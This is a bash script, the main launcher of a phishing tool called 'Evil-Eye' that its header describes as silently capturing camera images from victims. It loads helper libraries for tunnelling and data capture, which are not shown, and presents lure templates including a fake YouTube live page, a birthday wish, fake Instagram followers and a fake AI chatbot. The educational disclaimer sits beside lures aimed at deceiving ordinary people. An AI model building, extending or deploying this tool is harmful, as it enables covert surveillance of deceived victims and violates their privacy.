#!/bin/bash
# RGSecurityTeam - Evil-Eye
# encoding (utf-8 en)

#────────────────────────────────── Evil-Eye ──────────────────────────────────#
#                                                                              #
# This is a modern camera phishing script. It is capable of silently capturing #
# high-quality images of the victim's camera.                                  #
#──────────────────────────────────────────────────────────────────────────────#
# DISCLAIMER: This tool is developed for educational purposes and authorized   #
# penetration testing only. The developer (RGSecurityTeam) is not responsible  #
# for any misuse or damage caused by this program.                             #
#──────────────────────────────────────────────────────────────────────────────#
# This is inspired by techchip's champhish script                              #
#                                                                              #
#─────────────────────────────── RGSecurityTeam ───────────────────────────────#

# Colors
red="$(printf '\033[1;31m')"
green="$(printf '\033[1;32m')"
orange="$(printf '\033[1;93m')"
blue="$(printf '\033[1;34m')"
cyan="$(printf '\033[1;36m')"
white="$(printf '\033[1;37m')"
redbg="$(printf '\033[1;41m')"
nocolor="$(printf '\e[0m')"

# SCRIPT_DIR
SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)

trap terminate INT

# Load Source lib/
load_lib() {
    local libs=("check_net.sh" "dis_detect.sh" "banners.sh" "pkage_check.sh" "setup_files.sh" "tunnel.sh" "capture_data.sh" "others.sh" "update.sh")
    for lib in "${libs[@]}"; do
        if [ -f "$SCRIPT_DIR/lib/$lib" ]; then
            source "$SCRIPT_DIR/lib/$lib"
        else
            echo "${cyan}[${red}✖${cyan}]${red} Error:${white} Missing library ${green}$lib${white} at $SCRIPT_DIR/lib/"
            exit 1
        fi
    done
}

# Load Tools
load_tools() {
    { clear; small_banner; banner2; echo; }
    print_status "${white}Internet Connection" "$int_status"
    check_requirements "lolcat" "jq" "php" "curl" "wget" "cloudflared"
    sleep 1
}

# Main Menu
main_menu() {
    { clear; show_banner; banner2; echo; }
cat << EOF
    ${green}<<------ ${white}Select a Templates ${green}------>>${nocolor}

    ${cyan}[${orange}1${cyan}]${white} YouTube Live TV
    ${cyan}[${orange}2${cyan}]${white} Birthday Wish
    ${cyan}[${orange}3${cyan}]${white} Secret Message
    ${cyan}[${orange}4${cyan}]${white} Fake Instagram Followers
    ${cyan}[${orange}5${cyan}]${white} Chating Bot (Fake AI)
    ${cyan}[${red}6${cyan}]${red} Exit ${nocolor}

EOF
    read -p "    ${cyan}[${green}+${cyan}]${white} Select an options:${green} " templates

    case $templates in
        1) setup_youtube_tv ;;
        2) setup_birthday_wish ;;
        3) secret_msg ;;
        4) fake_insta_follower ;;
        5) chating_bot ;;
        6) exit_msg ;;
        *) invalid_options ;;
    esac
}

load_lib
kill_pid
init_setup
load_tools
check_for_updates
main_menu
